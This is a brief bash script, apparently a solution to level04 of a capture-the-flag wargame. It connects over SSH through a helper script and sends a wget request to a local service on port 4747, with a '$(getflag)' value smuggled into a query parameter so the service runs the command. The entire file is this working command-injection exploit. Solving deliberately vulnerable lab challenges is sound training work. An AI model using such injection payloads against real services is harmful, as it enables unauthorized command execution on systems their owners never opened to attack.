#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level04 "$pass" 'wget -qO- "localhost:4747/?x=\$(getflag)"'
